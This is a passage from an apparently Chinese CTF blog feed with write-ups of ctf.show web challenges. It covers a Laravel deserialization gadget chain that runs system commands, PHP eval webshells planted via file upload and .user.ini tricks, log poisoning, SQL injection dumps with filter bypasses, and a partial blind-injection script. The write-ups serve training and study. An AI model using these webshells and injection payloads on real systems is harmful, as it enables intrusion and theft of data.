language_">$this</span>-&gt;bindings=<span class="hljs-variable">$bind</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title class_">genericuser</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Auth</span>\<span class="hljs-title class_">GenericUser</span>(<br>        <span class="hljs-title class_">array</span>(<br>            &quot;<span class="hljs-title class_">expectedOutput</span>&quot;=&gt;<span class="hljs-title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;<span class="hljs-title class_">expectedQuestions</span>&quot;=&gt;<span class="hljs-title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    <span class="hljs-variable">$application</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Illuminate\Foundation\Application</span>(<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;<br>                <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&quot;concrete&quot;</span>=&gt;<span class="hljs-string">&quot;Illuminate\Foundation\Application&quot;</span><br>                     )<br>             )<br>    );<br>    <span class="hljs-variable">$pendingcommand</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<br>        <span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;tac /f*&#x27;</span>),<br>        <span class="hljs-variable">$genericuser</span>,<br>        <span class="hljs-variable">$application</span><br>    );<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pendingcommand</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门:文件上传</title>
    <link href="/2023/05/25/wenjianshangchuan/"/>
    <url>/2023/05/25/wenjianshangchuan/</url>
    
    <content type="html"><![CDATA[<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>首先创建一个记事本,内容为<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>然后修改文件后缀为png，因为题目要求上传一个图片文件，上传时使用burpsuite进行抓包，在burpsuit上修改将后缀名改为php<br><img src="/images/Y8.png"><br>文件上传成功后，会给你你刚才上传的路径<br><img src="/images/79.png"><br>在url中输入以进入路径，然后复制网址<br><img src="/images/6h.png"><br>使用中国蚁剑进入文件查询<br><img src="/images/87.png"><br>获取flag</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上，一模一样</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>这题不能通过该burpsuite中文件的后缀来获取flag</p><p>首先我们上传一个.user.ini文件，内容如下，我们可以先改为png后缀再抓包，修改，再上传</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=1.png<br></code></pre></td></tr></table></figure><p>然后我们再上传1.png<br>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们可以用中国蚁剑连接，连接后缀为&#x2F;upload&#x2F;index.php<br>还可以这样做<br>先检查木马是否上传完毕<br><img src="/images/V2.png"><br>在index.php进行命令执行成功，说明我们的木马上传成功<br>ls发现并没有flag<br><img src="/images/2b.png"><br>我们返回上一级试试<br><img src="/images/IP.png"><br>成功发现flag<br>再次post</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat ../flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>查看源码发现flag</p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>首先写好一个.user.ini文件<br>内容为auto_prepend_file&#x3D;1.pHp<br><strong>注：本题过滤了php，因此使用大小写混写可以跳过</strong><br>把.user.ini文件添加png后缀以成功提交<br>在提交时开启burpsuite 抓包<br><img src="/images/6CQ02C.png"><br>删除.png后缀<br><img src="/images/OHK.png"><br>成功提交<br>再写一个1.pHp文件<br>内容为<?pHp eval($_POST['a']);?><br>同样的php要大小写混用<br>把1.pHp后缀改为1.png<br>上传，抓包，把后缀.png改为.pHp<br><img src="/images/0XC3.png"><br>成功上传<br>接下来我们打开中国蚁剑<br><img src="/images/KAO6J.png"><br>成功连接<br>在&#x2F;var&#x2F;www&#x2F;html&#x2F;中找到flag.php<br>✌️</p><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>先上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.png<br><strong>注：本题过滤了php</strong><br>提交时开启burpsuite 抓包<br>删除.png后缀<br>成功提交<br>再写一个1.png文件<br>内容为<code>&lt;?= eval($POST[&#39;a&#39;]);?&gt;</code><br>直接提交<br>这样写虽然能成功连接中国蚁剑但是不能访问，所以<br>进入&#x2F;upload&#x2F;index.php路径<br>hackbar中post提交a&#x3D;system(“cat ..&#x2F;flag.php”);<br>打开源码即可看到flag</p><p>2<br>虽然本题过滤了php，但可以用txt<br>上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包，删除.png后缀<br>成功提交<br>写一个1.png文件<br>内容同上<br>抓包将png后缀改为.txt<br>上传成功<br>这样就能在中国蚁剑上访问了<br>同样的flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传1.png文件 内容为 <code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;);?&gt;</code><br>在burpsuite里改为1.txt<br>这题过滤了php还有[]，所以[]用{}代替<br>接下来就和上一题一样了<br>上传一个.user.ini.png<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包后改为.user.ini<br>进入&#x2F;upload&#x2F;index.php 打开蚁剑，成功连接，找到flag<br>也可以在post里输入a&#x3D;system(“cat ..&#x2F;flag.php”);<br>找到flag</p><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>本题又添加过滤了;<br>我们可以把语句用括号()包含，<br>1.png<br>内容：<code>&lt;?=(system(&quot;cat ../fla*&quot;))?&gt;</code></p><p>.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p><p>上传这两个后进入&#x2F;upload查看flag</p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同157题</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>本题又过滤了括号，我们可以用反引号代替括号<br>1.png<br>内容：<code>&lt;?= `cat ../fla*`?&gt;</code></p><p>.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p><p>上传后进入&#x2F;upload查看flag</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>本题添加了日志包含，nginx的日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，过滤了log，用.拼接<br>include”&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.lo”.”g”</p><p>首先先上传.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p><p>再上传1.png<br>内容：<code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p><p>进入&#x2F;uoload 发现日志包含ua头,我们在ua头写cat语句<br>User-Agent:<code>&lt;?=`cat ../fla*`?&gt;</code><br>成功显示flag</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>本题较上一题添加了绕过PHP函数getimagesize()检测文件头，老套路，上传的文件首行都加一个GIF89A,其余操作同160题</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf_web</title>
    <link href="/2023/05/23/ctfweb/"/>
    <url>/2023/05/23/ctfweb/</url>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>ctrl+u查看源代码即可找到base64编码形式的flag</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>输入万能钥匙<br><img src="/images/fuck.png"><br>使用burp suite抓包<br>在burp suite里右键选择send to repeater<br>使用联合查询来查询回显位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/1.png"><br>接着就是爆库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> fron information_schema.columns where table_name=&#x27;flag&#x27;#<br></code></pre></td></tr></table></figure><p>爆值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> from flag#<br></code></pre></td></tr></table></figure><p><img src="/images/2.png"><br>获得flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>页面中显示了部分源码，明显是引导我们利用文件包含漏洞进行操作，源码中的include()函数通过GET请求接受一个url参数，那接下来我们就给它传递一个url参数</p><p>这里我们使用burp suite抓包，利用php:&#x2F;&#x2F;input伪协议执行PHP代码，代码的内容为执行系统命令，查看当前目录下所有文件。</p><p><img src="/images/3.png"></p><p>很明显这个ctf_go_go_go文件就是存放flag的文件<br><img src="/images/4.png"><br>我们直接在url地址中拼接url参数，访问ctf_go_go文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=ctf_go_go_go<br></code></pre></td></tr></table></figure><p>成功获取flag!</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进入题目，看到只有一句文件包含的提示。<br>这题使用input协议data协议都不可行，应该是被禁用了，所以从数据包入手<br><img src="/images/5.png"></p><p>我们发现该道题使用的是nginx服务器，那我们想到可不可以通过日志文件进行写码得到flag呢，所以我们访问日志看看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p><img src="/images/6.png"></p><blockquote><p>查看日志发现，每访问一次数据包中的User-Agent头会被写进日志中，那就尝试在UA头中写码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/7.png"></p><blockquote><p>在UA头后插入一句话木马后日志文件里并未显示说明木马已经被解析了，然后使用蚁剑连接。</p></blockquote><p><img src="/images/8.png"><br>连接后，flag就在网页根目录中<br><img src="/images/9.png"><br>获得flag！</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>首先打开页面是一个页面源码，我们先来进行代码审计，看看有没有可以利用的地方</p><p>重点审计这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有四个if语句，构造的v1和v2满足这三个条件即可得到flag<br>第一个if语句要求v1和v2不能为空<br>这里有两个php检测函数</p><blockquote><ul><li>ctype_alpha ——做纯字符检测</li><li>ctype_alpha(string $text): bool</li></ul></blockquote><p>查看提供的string，text里面的所有字符是否只包含字符。 在标准的 C 语言环境下，字母仅仅是指 [A-Za-z] ， ctype_alpha() 等同于 (ctype_upper($text) || ctype_lower($text)) 如果 text 是简单的单个字符串还好，但是在其他语言中有些字母被认为既不是大写也不是小写。</p><p>所以，我们构造的v1必须是只有字母，才能绕过第二个if语句的过滤</p><blockquote><ul><li>is_numeric()函数用于检测变量是否为数字或数字字符串。<br>如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意浮点型返回空值，即返回FALSE。</li></ul></blockquote><p>也就是说，v2必须是只有数字，才能绕过第三个if语句的过滤</p><p>然后再看最后一条if语句，要求v1和v2的值经过MD5加密后还必须相等，if(md5($v1)&#x3D;&#x3D;md5($v2)),接下来我们开始想方法构造v1和v2的值</p><p>md5漏洞介绍：<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。这样最后php解析到的v1和v2的md5值就都是0了<br>构造v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</p><p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854</p><p>输入到url中，成功获取flag</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>username尝试输入万能密码1’ or 1&#x3D;1#<br>密码随意<br>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法</p><blockquote><p>&#x2F;**&#x2F;<br>()<br>回车(url编码中的%0a)<br>&#96;(tap键上面的按钮)<br>tap<br>两个空格</p></blockquote><p>这里选择&#x2F;**&#x2F;</p><p>接下来就到了广为人知的爆库，爆表，爆字段，爆字段值环节</p><p>爆库</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database()),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>又又又是sql注入漏洞题<br>一共有三个文章，通过点击切换不同的文章可以看出url地址的差别，页面同过文章的id值来查询文章内容，我们可以考虑sql注入漏洞<br><img src="/images/10.png"><br>首先判断注入点，输入以下payload，使sql恒成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>页面正常显示</p><p>再输入以下payload，使sql恒不成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>页面空显示</p><p>由此可以判断页面存在sql注入，注入点为<strong>数值型注入</strong>，页面中有显示位，可以尝试<strong>联合注入</strong>进行脱库<br>先来判断显示位，此处id传一个-1，由于id通常不为负数，后端根据id查询不到内容，就只能展示联合查询的结果，从而帮助我们判断字段显示的位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/images/11.png"><br>下面就是广为人知的爆*环节了<br>爆库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=&quot;flag&quot;),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-regexp">/**/</span>flag<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>成功获取flag值</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>本题过滤了空格，逗号，and，union等关键字<br>空格依旧是用&#x2F;**&#x2F;替代<br>and可使用or 替代</p><p>首先狠狠的注入，输入以下payload使sql恒成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>由于sql恒成立，数据库将查询出表中的所有内容，并返回到前端展示<br><img src="/images/555.png"></p><p>在输入以下payload使sql恒不成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>由于sql恒不成立，数据库查询不到任何数据，从而导致页面空显示</p><p>由以上结果可知，该页面存在sql注入，注入点为数值型注入</p><p>接下来进行脱库，由于盲注脱库比较复杂，此处我们拿抄来的python脚本😊进行自动化脱库，注意payload中的字符串不换行，否则可能会出问题</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://9d1bf0f8-9f4f-4cd2-bd17-a1024a0d065c.challenge.ctf.show/index.php?id=-1<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br>name = &#x27;&#x27;<br> <br># 循环45次( 循环次数按照返回的字符串长度自定义)<br>for i in range(1, 45):<br>    # 获取当前使用的数据库<br>    # payload = &#x27;ascii(substr(database()from<span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span>for<span class="hljs-comment">/**/</span>1))=%d&#x27;<br>    # 获取当前数据库的所有表<br>    # payload = &#x27;ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的字段</span><br><span class="hljs-string">    # payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-number">0x666C6167</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的数据</span><br><span class="hljs-string">    payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    count = 0</span><br><span class="hljs-string">    print(&#x27;</span>正在获取第 %d 个字符<span class="hljs-string">&#x27; % i)</span><br><span class="hljs-string">    # 截取SQL查询结果的每个字符, 并判断字符内容</span><br><span class="hljs-string">    for j in range(31, 128):</span><br><span class="hljs-string">        result = requests.get(url + payload % (i, j))</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        if &#x27;</span><span class="hljs-keyword">If</span><span class="hljs-string">&#x27; in result.text:</span><br><span class="hljs-string">            name += chr(j)</span><br><span class="hljs-string">            